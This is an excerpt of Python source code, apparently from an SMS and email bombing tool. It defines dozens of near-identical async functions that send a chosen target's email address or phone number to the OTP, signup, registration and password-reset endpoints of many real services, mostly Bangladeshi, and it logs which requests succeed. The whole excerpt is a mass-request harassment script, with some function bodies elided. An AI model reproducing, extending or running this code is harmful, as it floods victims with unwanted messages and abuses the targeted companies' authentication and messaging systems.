    async def api_curl041_tethys_trucklagbe_com(self):
        ...
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL041 tethys.trucklagbe.com", success, res.status, api_key="CURL041 tethys.trucklagbe.com")
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
            ...
            await self.log_event("CURL041 tethys.trucklagbe.com", False, "Error", api_key="CURL041 tethys.trucklagbe.com")
            return False
    ...
    async def api_curl042_mcprod_aarong_com(self):
        ...
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL042 mcprod.aarong.com", success, res.status, api_key="CURL042 mcprod.aarong.com")
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
            ...
            await self.log_event("CURL042 mcprod.aarong.com", False, "Error", api_key="CURL042 mcprod.aarong.com")
            return False
    ...
    async def api_curl043_www_aarong_com(self):
        ...
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL043 www.aarong.com", success, res.status, api_key="CURL043 www.aarong.com")
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
            ...
            await self.log_event("CURL043 www.aarong.com", False, "Error", api_key="CURL043 www.aarong.com")
            return False
    ...
    async def api_curl044_api_englishmojabd_com(self):
        ...
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL044 api.englishmojabd.com", success, res.status, api_key="CURL044 api.englishmojabd.com")
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
            ...
            await self.log_event("CURL044 api.englishmojabd.com", False, "Error", api_key="CURL044 api.englishmojabd.com")
            return False
    ...
    async def api_curl045_api_pathao_com(self):
        ...
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL045 api.pathao.com", success, res.status, api_key="CURL045 api.pathao.com")
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
            ...
            await self.log_event("CURL045 api.pathao.com", False, "Error", api_key="CURL045 api.pathao.com")
            return False
    ...
    async def api_curl046_web_tallykhata_com(self):
        ...
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL046 web.tallykhata.com", success, res.status, api_key="CURL046 web.tallykhata.com")
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
            ...
            await self.log_event("CURL046 web.tallykhata.com", False, "Error", api_key="CURL046 web.tallykhata.com")
            return False
    ...
    async def api_curl047_npapigwnew_nobopay_com(self):
        ...
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL047 npapigwnew.nobopay.com", success, res.status, api_key="CURL047 npapigwnew.nobopay.com")
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
            ...
            await self.log_event("CURL047 npapigwnew.nobopay.com", False, "Error", api_key="CURL047 npapigwnew.nobopay.com")
            return False
    ...
    async def api_curl048_distribution_hishabee_business(self):
        ...
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL048 distribution.hishabee.business", success, res.status, api_key="CURL048 distribution.hishabee.business")
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
            ...
            await self.log_event("CURL048 distribution.hishabee.business", False, "Error", api_key="CURL048 distribution.hishabee.business")
            return False
    ...
    async def api_api109_local_otp_send_103_4_145_86(self):
        ...
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API109 - Local OTP Send (103.4.145.86)", success, res.status, api_key="API109 - Local OTP Send (103.4.145.86)")
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
            ...
            await self.log_event("API109 - Local OTP Send (103.4.145.86)", False, "Error", api_key="API109 - Local OTP Send (103.4.145.86)")
            return False
    ...
    async def api_api113_bd_kepler_registration_otp(self):
        ...
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API113 - BD Kepler Registration OTP", success, res.status, api_key="API113 - BD Kepler Registration OTP")
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
            ...
            await self.log_event("API113 - BD Kepler Registration OTP", False, "Error", api_key="API113 - BD Kepler Registration OTP")
            return False
    ...
    async def api_api125_shadhin_music_otp_req(self):
        ...
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API125 - Shadhin Music OTP Req", success, res.status, api_key="API125 - Shadhin Music OTP Req")
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
            ...
            await self.log_event("API125 - Shadhin Music OTP Req", False, "Error", api_key="API125 - Shadhin Music OTP Req")
            return False
    ...
    async def api_api142_hishabee_number_check(self):
        ...
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API142 - Hishabee Number Check", success, res.status, api_key="API142 - Hishabee Number Check")
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
            ...
            await self.log_event("API142 - Hishabee Number Check", False, "Error", api_key="API142 - Hishabee Number Check")
            return False
    ...
    async def api_email52____bikroy_account(self):
        ...
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL52 - Bikroy Account", success, res.status, api_key="EMAIL52 - Bikroy Account")
                return success
        except Exception:
            await self.log_event("EMAIL52 - Bikroy Account", False, "Error", api_key="EMAIL52 - Bikroy Account")
            return False
    ...
    async def api_email53____bikroy_password_reset(self):
        ...
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL53 - Bikroy Password Reset", success, res.status, api_key="EMAIL53 - Bikroy Password Reset")
                return success
        except Exception:
            await self.log_event("EMAIL53 - Bikroy Password Reset", False, "Error", api_key="EMAIL53 - Bikroy Password Reset")
            return False
    ...
    async def api_email54____busbud_signup(self):
        ...
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL54 - Busbud Signup", success, res.status, api_key="EMAIL54 - Busbud Signup")
                return success
        except Exception:
            await self.log_event("EMAIL54 - Busbud Signup", False, "Error", api_key="EMAIL54 - Busbud Signup")
            return False
    ...
    async def api_email55____mithaibd_register(self):
        ...
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL55 - Mithaibd Register", success, res.status, api_key="EMAIL55 - Mithaibd Register")
                return success
        except Exception:
            await self.log_event("EMAIL55 - Mithaibd Register", False, "Error", api_key="EMAIL55 - Mithaibd Register")
            return False
    ...
    async def api_email56____sara_lifestyle_otp(self):
        ...
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL56 - Sara Lifestyle OTP", success, res.status, api_key="EMAIL56 - Sara Lifestyle OTP")
                return success
        except Exception:
            await self.log_event("EMAIL56 - Sara Lifestyle OTP", False, "Error", api_key="EMAIL56 - Sara Lifestyle OTP")
            return False
    ...
    async def api_email57____tohfay_register(self):
        ...
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL57 - Tohfay Register", success, res.status, api_key="EMAIL57 - Tohfay Register")
                return success
        except Exception:
            await self.log_event("EMAIL57 - Tohfay Register", False, "Error", api_key="EMAIL57 - Tohfay Register")
            return False
    ...
    async def api_email58____tohfay_forgot(self):
        ...
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL58 - Tohfay Forgot", success, res.status, api_key="EMAIL58 - Tohfay Forgot")
                return success
        except Exception:
            await self.log_event("EMAIL58 - Tohfay Forgot", False, "Error", api_key="EMAIL58 - Tohfay Forgot")
            return False
    ...
    async def api_email59____mrmedicinemart_signup(self):
        ...
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL59 - MrMedicineMart Signup", success, res.status, api_key="EMAIL59 - MrMedicineMart Signup")
                return success
        except Exception:
            await self.log_event("EMAIL59 - MrMedicineMart Signup", False, "Error", api_key="EMAIL59 - MrMedicineMart Signup")
            return False
    ...
    async def api_email60____mrmedicinemart_reset(self):
        ...
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL60 - MrMedicineMart Reset", success, res.status, api_key="EMAIL60 - MrMedicineMart Reset")
                return success
        except Exception:
            await self.log_event("EMAIL60 - MrMedicineMart Reset", False, "Error", api_key="EMAIL60 - MrMedicineMart Reset")
            return False
    ...
    async def api_email61____marhampharmacy_register(self):
        ...
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL61 - MarhamPharmacy Register", success, res.status, api_key="EMAIL61 - MarhamPharmacy Register")
                return success
        except Exception:
            await self.log_event("EMAIL61 - MarhamPharmacy Register", False, "Error", api_key="EMAIL61 - MarhamPharmacy Register")
            return False
    ...
    async def api_email62____giftinday_register(self):
        ...
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL62 - GiftInDay Register", success, res.status, api_key="EMAIL62 - GiftInDay Register")
                return success
        except Exception:
            await self.log_event("EMAIL62 - GiftInDay Register", False, "Error", api_key="EMAIL62 - GiftInDay Register")
            return False
    ...
    async def api_email63____giftinday_password_reset(self):
        ...
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL63 - GiftInDay Password Reset", success, res.status, api_key="EMAIL63 - GiftInDay Password Reset")
                return success
        except Exception:
            await self.log_event("EMAIL63 - GiftInDay Password Reset", False, "Error", api_key="EMAIL63 - GiftInDay Password Reset")
            return False
    ...
    async def api_email64____sentimentsexpress_register(self):
        ...
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL64 - SentimentsExpress Register", success, res.status, api_key="EMAIL64 - SentimentsExpress Register")
                return success
        except Exception:
            await self.log_event("EMAIL64 - SentimentsExpress Register", False, "Error", api_key="EMAIL64 - SentimentsExpress Register")
            return False
    ...
    async def api_email65____robishop_create(self):
        ...
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL65 - RobiShop Create", success, res.status, api_key="EMAIL65 - RobiShop Create")
                return success
        except Exception:
            await self.log_event("EMAIL65 - RobiShop Create", False, "Error", api_key="EMAIL65 - RobiShop Create")
            return False
    ...
    async def api_email66____robishop_reset(self):
        ...
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL66 - RobiShop Reset", success, res.status, api_key="EMAIL66 - RobiShop Reset")
                return success
        except Exception:
            await self.log_event("EMAIL66 - RobiShop Reset", False, "Error", api_key="EMAIL66 - RobiShop Reset")
            return False
    ...
    async def api_email67____clickbd_signup(self):
        ...
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL67 - ClickBD Signup", success, res.status, api_key="EMAIL67 - ClickBD Signup")
                return success
        except Exception:
            await self.log_event("EMAIL67 - ClickBD Signup", False, "Error", api_key="EMAIL67 - ClickBD Signup")
            return False
    ...
    async def api_email68____clickbd_recovery(self):
        ...
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL68 - ClickBD Recovery", success, res.status, api_key="EMAIL68 - ClickBD Recovery")
                return success
        except Exception:
            await self.log_event("EMAIL68 - ClickBD Recovery", False, "Error", api_key="EMAIL68 - ClickBD Recovery")
            return False
    ...
    async def api_email69____diamu_register(self):
        ...
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL69 - Diamu Register", success, res.status, api_key="EMAIL69 - Diamu Register")
                return success
        except Exception:
            await self.log_event("EMAIL69 - Diamu Register", False, "Error", api_key="EMAIL69 - Diamu Register")
            return False
    ...
    async def api_email70____diamu_password_reset(self):
        ...
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL70 - Diamu Password Reset", success, res.status, api_key="EMAIL70 - Diamu Password Reset")
                return success
        except Exception:
            await self.log_event("EMAIL70 - Diamu Password Reset", False, "Error", api_key="EMAIL70 - Diamu Password Reset")
            return False
    ...
    async def api_email71____zymak_register(self):
        ...
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL71 - Zymak Register", success, res.status, api_key="EMAIL71 - Zymak Register")
                return success
        except Exception:
            await self.log_event("EMAIL71 - Zymak Register", False, "Error", api_key="EMAIL71 - Zymak Register")
            return False
    ...
    async def api_email72____zymak_password_reset(self):
        ...
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL72 - Zymak Password Reset", success, res.status, api_key="EMAIL72 - Zymak Password Reset")
                return success
        except Exception:
            await self.log_event("EMAIL72 - Zymak Password Reset", False, "Error", api_key="EMAIL72 - Zymak Password Reset")
            return False
    ...
    async def api_email73____shopz_register(self):
        ...
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL73 - ShopZ Register", success, res.status, api_key="EMAIL73 - ShopZ Register")
                return success
        except Exception:
            await self.log_event("EMAIL73 - ShopZ Register", False, "Error", api_key="EMAIL73 - ShopZ Register")
            return False
    ...
    async def api_email74____shopz_password_reset(self):
        ...
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL74 - ShopZ Password Reset", success, res.status, api_key="EMAIL74 - ShopZ Password Reset")
                return success
        except Exception:
            await self.log_event("EMAIL74 - ShopZ Password Reset", False, "Error", api_key="EMAIL74 - ShopZ Password Reset")
            return False
    ...
    async def api_email75____xclusivebrands_register(self):
        ...
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL75 - XclusiveBrands Register", success, res.status, api_key="EMAIL75 - XclusiveBrands Register")
                return success
        except Exception:
            await self.log_event("EMAIL75 - XclusiveBrands Register", False, "Error", api_key="EMAIL75 - XclusiveBrands Register")
            return False
    ...
    async def api_email76____xclusivebrands_lost_password(self):
        ...
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL76 - XclusiveBrands Lost Password", success, res.status, api_key="EMAIL76 - XclusiveBrands Lost Password")
                return success
        except Exception:
            await self.log_event("EMAIL76 - XclusiveBrands Lost Password", False, "Error", api_key="EMAIL76 - XclusiveBrands Lost Password")
            return False
    ...
    async def api_email77____bdmanja_register(self):
        ...
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL77 - BDManja Register", success, res.status, api_key="EMAIL77 - BDManja Register")
                return success
        except Exception:
            await self.log_event("EMAIL77 - BDManja Register", False, "Error", api_key="EMAIL77 - BDManja Register")
            return False
    ...
    async def api_email78____bdmanja_password_reset(self):
        ...
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL78 - BDManja Password Reset", success, res.status, api_key="EMAIL78 - BDManja Password Reset")
                return success
        except Exception:
            await self.log_event("EMAIL78 - BDManja Password Reset", False, "Error", api_key="EMAIL78 - BDManja Password Reset")
            return False
    ...
    async def api_email79____xclusivebrands_register_2(self):
        ...
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL79 - XclusiveBrands Register 2", success, res.status, api_key="EMAIL79 - XclusiveBrands Register 2")
                return success
        except Exception:
            await self.log_event("EMAIL79 - XclusiveBrands Register 2", False, "Error", api_key="EMAIL79 - XclusiveBrands Register 2")
            return False
    ...
    async def api_email80____xclusivebrands_lost_password_2(self):
        ...
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL80 - XclusiveBrands Lost Password 2", success, res.status, api_key="EMAIL80 - XclusiveBrands Lost Password 2")
                return success
        except Exception:
            await self.log_event("EMAIL80 - XclusiveBrands Lost Password 2", False, "Error", api_key="EMAIL80 - XclusiveBrands Lost Password 2")
            return False
    ...
    async def api_email81____gameghor_register(self):
        ...
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL81 - GameGhor Register", success, res.status, api_key="EMAIL81 - GameGhor Register")
                return success
        except Exception:
            await self.log_event("EMAIL81 - GameGhor Register", False, "Error", api_key="EMAIL81 - GameGhor Register")
            return False
    ...
    async def api_email82____gameghor_password_reset(self):
        ...
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL82 - GameGhor Password Reset", success, res.status, api_key="EMAIL82 - GameGhor Password Reset")
                return success
        except Exception:
            await self.log_event("EMAIL82 - GameGhor Password Reset", False, "Error", api_key="EMAIL82 - GameGhor Password Reset")
            return False
    ...
    async def api_email83____potakait_register(self):
        ...
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL83 - PotakaIT Register", success, res.status, api_key="EMAIL83 - PotakaIT Register")
                return success
        except Exception:
            await self.log_event("EMAIL83 - PotakaIT Register", False, "Error", api_key="EMAIL83 - PotakaIT Register")
            return False
    ...
    async def api_email84____gamebuybd_register(self):
        ...
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL84 - GameBuyBD Register", success, res.status, api_key="EMAIL84 - GameBuyBD Register")
                return success
        except Exception:
            await self.log_event("EMAIL84 - GameBuyBD Register", False, "Error", api_key="EMAIL84 - GameBuyBD Register")
            return False
    ...
    async def api_email85____gamebuybd_lost_password(self):
        ...
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL85 - GameBuyBD Lost Password", success, res.status, api_key="EMAIL85 - GameBuyBD Lost Password")
                return success
        except Exception:
            await self.log_event("EMAIL85 - GameBuyBD Lost Password", False, "Error", api_key="EMAIL85 - GameBuyBD Lost Password")
            return False
    ...
    async def api_email86____gameforce_register(self):
        ...
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL86 - GameForce Register", success, res.status, api_key="EMAIL86 - GameForce Register")
                return success
        except Exception:
            await self.log_event("EMAIL86 - GameForce Register", False, "Error", api_key="EMAIL86 - GameForce Register")
            return False
    ...
    async def api_email87____gameforce_lost_password(self):
        ...
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL87 - GameForce Lost Password", success, res.status, api_key="EMAIL87 - GameForce Lost Password")
                return success
        except Exception:
            await self.log_event("EMAIL87 - GameForce Lost Password", False, "Error", api_key="EMAIL87 - GameForce Lost Password")
            return False
    ...
    async def api_email88____gamecastlebd_register(self):
        ...
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL88 - GameCastleBD Register", success, res.status, api_key="EMAIL88 - GameCastleBD Register")
                return success
        except Exception:
            await self.log_event("EMAIL88 - GameCastleBD Register", False, "Error", api_key="EMAIL88 - GameCastleBD Register")
            return False
    ...
    async def api_email89____gamecastlebd_lost_password(self):
        ...
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL89 - GameCastleBD Lost Password", success, res.status, api_key="EMAIL89 - GameCastleBD Lost Password")
                return success
        except Exception:
            await self.log_event("EMAIL89 - GameCastleBD Lost Password", False, "Error", api_key="EMAIL89 - GameCastleBD Lost Password")
            return False
    ...
    async def api_email90____techshopbd_signup(self):
        ...
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL90 - TechShopBD Signup", success, res.status, api_key="EMAIL90 - TechShopBD Signup")
                return success
        except Exception:
            await self.log_event("EMAIL90 - TechShopBD Signup", False, "Error", api_key="EMAIL90 - TechShopBD Signup")
            return False
    ...
    async def api_email91____electronics_register(self):
        ...
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL91 - Electronics Register", success, res.status, api_key="EMAIL91 - Electronics Register")
                return success
        except Exception:
            await self.log_event("EMAIL91 - Electronics Register", False, "Error", api_key="EMAIL91 - Electronics Register")
            return False
    ...
    async def api_email92____electronics_recovery(self):
        ...
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL92 - Electronics Recovery", success, res.status, api_key="EMAIL92 - Electronics Recovery")
                return success
        except Exception:
            await self.log_event("EMAIL92 - Electronics Recovery", False, "Error", api_key="EMAIL92 - Electronics Recovery")
            return False
    ...
    async def api_email93____electronics_bangladesh_otp(self):
        ...
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL93 - Electronics Bangladesh OTP", success, res.status, api_key="EMAIL93 - Electronics Bangladesh OTP")
                return success
        except Exception:
            await self.log_event("EMAIL93 - Electronics Bangladesh OTP", False, "Error", api_key="EMAIL93 - Electronics Bangladesh OTP")
            return False
    ...
    async def api_email94____singerbd_otp(self):
        ...
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL94 - SingerBD OTP", success, res.status, api_key="EMAIL94 - SingerBD OTP")
                return success
        except Exception:
            await self.log_event("EMAIL94 - SingerBD OTP", False, "Error", api_key="EMAIL94 - SingerBD OTP")
            return False
    ...
    async def api_email95____robotechbd_register(self):
        ...
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL95 - RoboTechBD Register", success, res.status, api_key="EMAIL95 - RoboTechBD Register")
                return success
        except Exception:
            await self.log_event("EMAIL95 - RoboTechBD Register", False, "Error", api_key="EMAIL95 - RoboTechBD Register")
            return False
    ...
    async def api_email96____robotechbd_lost_password(self):
        ...
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL96 - RoboTechBD Lost Password", success, res.status, api_key="EMAIL96 - RoboTechBD Lost Password")
                return success
        except Exception:
            await self.log_event("EMAIL96 - RoboTechBD Lost Password", False, "Error", api_key="EMAIL96 - RoboTechBD Lost Password")
            return False
    ...
    async def api_email97____electronicshopbd_register(self):
        ...
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL97 - ElectronicShopBD Register", success, res.status, api_key="EMAIL97 - ElectronicShopBD Register")
                return success
        except Exception:
            await self.log_event("EMAIL97 - ElectronicShopBD Register", False, "Error", api_key="EMAIL97 - ElectronicShopBD Register")
            return False
    ...
    async def api_email98____electronicshopbd_lost_password(self):
        ...
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL98 - ElectronicShopBD Lost Password", success, res.status, api_key="EMAIL98 - ElectronicShopBD Lost Password")
                return success
        except Exception:
            await self.log_event("EMAIL98 - ElectronicShopBD Lost Password", False, "Error", api_key="EMAIL98 - ElectronicShopBD Lost Password")
            return False
    ...
    async def api_email99____makersbd_register(self):
        ...
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL99 - MakersBD Register", success, res.status, api_key="EMAIL99 - MakersBD Register")
                return success
        except Exception:
            await self.log_event("EMAIL99 - MakersBD Register", False, "Error", api_key="EMAIL99 - MakersBD Register")
            return False
    ...
    async def api_email100____globalbrand_register(self):
        ...
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL100 - GlobalBrand Register", success, res.status, api_key="EMAIL100 - GlobalBrand Register")
                return success
        except Exception:
            await self.log_event("EMAIL100 - GlobalBrand Register", False, "Error", api_key="EMAIL100 - GlobalBrand Register")
            return False
    ...
    async def api_email101____globalbrand_forgot(self):
        ...
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL101 - GlobalBrand Forgot", success, res.status, api_key="EMAIL101 - GlobalBrand Forgot")
                return success
        except Exception:
            await self.log_event("EMAIL101 - GlobalBrand Forgot", False, "Error", api_key="EMAIL101 - GlobalBrand Forgot")
            return False
    ...
    async def api_email102____orient_electronics_register(self):
        ...
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL102 - Orient Electronics Register", success, res.status, api_key="EMAIL102 - Orient Electronics Register")
                return success
        except Exception:
            await self.log_event("EMAIL102 - Orient Electronics Register", False, "Error", api_key="EMAIL102 - Orient Electronics Register")
            return False
    ...
    async def api_email103____orient_electronics_password_reset(self):
        ...
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL103 - Orient Electronics Password Reset", success, res.status, api_key="EMAIL103 - Orient Electronics Password Reset")
                return success
        except Exception:
            await self.log_event("EMAIL103 - Orient Electronics Password Reset", False, "Error", api_key="EMAIL103 - Orient Electronics Password Reset")
            return False
    ...
    async def api_email104____abe_register(self):
        ...
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL104 - ABE Register", success, res.status, api_key="EMAIL104 - ABE Register")
                return success
        except Exception:
            await self.log_event("EMAIL104 - ABE Register", False, "Error", api_key="EMAIL104 - ABE Register")
            return False
    ...
    async def api_email105____abe_forget_password(self):
        ...
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL105 - ABE Forget Password", success, res.status, api_key="EMAIL105 - ABE Forget Password")
                return success
        except Exception:
            await self.log_event("EMAIL105 - ABE Forget Password", False, "Error", api_key="EMAIL105 - ABE Forget Password")
            return False
    ...
    async def api_email106____nurtelecom_register(self):
        ...
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL106 - NurTelecom Register", success, res.status, api_key="EMAIL106 - NurTelecom Register")
                return success
        except Exception:
            await self.log_event("EMAIL106 - NurTelecom Register", False, "Error", api_key="EMAIL106 - NurTelecom Register")
